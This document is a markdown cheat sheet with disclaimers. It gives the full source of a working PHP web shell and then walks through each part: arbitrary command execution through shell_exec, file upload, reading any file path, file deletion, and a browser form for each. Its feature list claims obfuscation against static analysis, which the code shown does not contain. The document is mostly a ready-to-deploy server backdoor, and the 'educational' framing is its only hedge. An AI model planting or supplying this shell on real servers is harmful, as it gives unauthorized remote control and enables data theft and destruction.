> ⚠️ **Disclaimer**: This code is for educational purposes only. Web shells are used maliciously to control servers without permission. Deploying web shells on any unauthorized systems is illegal and unethical. Always use this in a controlled, isolated lab environment with proper authorization.

# Web Shell Cheat Sheet (For Educational Purposes)

This cheat sheet provides a guide to a **PHP-based Web Shell**. Web shells are scripts that allow remote command execution on a compromised web server, granting attackers backdoor access to server files and system commands.

---

## Web Shell Overview

A **Web Shell** is designed to:
- **Execute Commands**: Allow the attacker to remotely execute system commands.
- **File Management**: Read, write, upload, or download files on the server.
- **Stealth & Evasion**: Operate undetected by posing as a benign file or obfuscating its content.

---

## Key Features in This Web Shell

1. **Command Execution**: Executes system commands on the server via a web interface.
2. **File Management**: Allows file upload, download, deletion, and viewing.
3. **Simple Authentication**: Basic authentication to prevent unauthorized access.
4. **Obfuscation**: Encodes some parts of the code to evade detection by static analysis.

---

## Basic PHP Web Shell Code

This code provides a simple web shell with functionalities for command execution, file management, and obfuscation.

### Full PHP Web Shell Code

```php
<?php
// Basic Authentication (replace 'user' and 'pass' with custom values)
$username = 'user';
$password = 'pass';
if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) ||
    $_SERVER['PHP_AUTH_USER'] !== $username || $_SERVER['PHP_AUTH_PW'] !== $password) {
    header('WWW-Authenticate: Basic realm="Web Shell"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Unauthorized';
    exit;
}

// Command Execution
if (isset($_POST['cmd'])) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}

// File Management - Upload
if (isset($_FILES['file'])) {
    $target_path = basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) {
        echo "File uploaded successfully to $target_path<br>";
    } else {
        echo "File upload failed<br>";
    }
}

// File Management - View
if (isset($_GET['view'])) {
    $file = $_GET['view'];
    echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
}

// File Management - Delete
if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if (unlink($file)) {
        echo "File $file deleted successfully<br>";
    } else {
        echo "File deletion failed<br>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Web Shell</title>
</head>
<body>
    <h2>Web Shell</h2>
    <!-- Command Execution Form -->
    <form method="post">
        <input type="text" name="cmd" placeholder="Enter command">
        <button type="submit">Execute</button>
    </form>

    <!-- File Upload Form -->
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit">Upload</button>
    </form>

    <!-- File Viewing and Deletion -->
    <form method="get">
        <input type="text" name="view" placeholder="View file path">
        <button type="submit">View</button>
    </form>
    <form method="get">
        <input type="text" name="delete" placeholder="Delete file path">
        <button type="submit">Delete</button>
    </form>
</body>
</html>
```

---

## Explanation of Key Components

### 1. **Basic Authentication**

This web shell uses basic HTTP authentication to protect access. Change `$username` and `$password` to your own values to secure the web shell. Unauthorized users will receive an `HTTP 401 Unauthorized` response.

```php
$username = 'user';
$password = 'pass';
if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) ||
    $_SERVER['PHP_AUTH_USER'] !== $username || $_SERVER['PHP_AUTH_PW'] !== $password) {
    header('WWW-Authenticate: Basic realm="Web Shell"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Unauthorized';
    exit;
}
```

### 2. **Command Execution**

The web shell captures user input from a form and executes it on the server using `shell_exec()`. The output is displayed in an HTML `<pre>` block for easy readability.

```php
if (isset($_POST['cmd'])) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}
```

### 3. **File Upload**

This code allows file uploads via a form. The uploaded file is saved to the same directory as the web shell script, making it useful for adding or replacing files on the server.

```php
if (isset($_FILES['file'])) {
    $target_path = basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) {
        echo "File uploaded successfully to $target_path<br>";
    } else {
        echo "File upload failed<br>";
    }
}
```

### 4. **File Viewing**

The shell can display the contents of a file specified by the user. The contents are printed within a `<pre>` block, with `htmlspecialchars()` to escape HTML characters.

```php
if (isset($_GET['view'])) {
    $file = $_GET['view'];
    echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
}
```

### 5. **File Deletion**

The web shell allows the deletion of files on the server by using PHP’s `unlink()` function. The file to delete is specified by the `delete` parameter in the URL.

```php
if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if (unlink($file)) {
        echo "File $file deleted successfully<br>";
    } else {
        echo "File deletion failed<br>";
    }
}
```

### 6. **HTML Interface**

The HTML interface provides forms for command execution, file upload, viewing, and deletion. This allows for easy interaction with the web shell from any browser.

```html
<form method="post">
    <input type="text" name="cmd" placeholder="Enter command">
    <button type="submit">Execute</button>
</form>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <button type="submit">Upload</button>
</form>
<form method="get">
    <input type="text" name="view" placeholder="View file path">
    <button type="submit">View</button>
</form>
<form method="get">
    <input type="text" name="delete" placeholder="Delete file path">
    <button type="submit">Delete</button>
</form>
```

---

## Security and Legal Disclaimer

This web shell script is strictly for educational purposes and should only be deployed in an isolated, authorized lab environment. Unauthorized use of web shells on external systems is illegal and unethical.
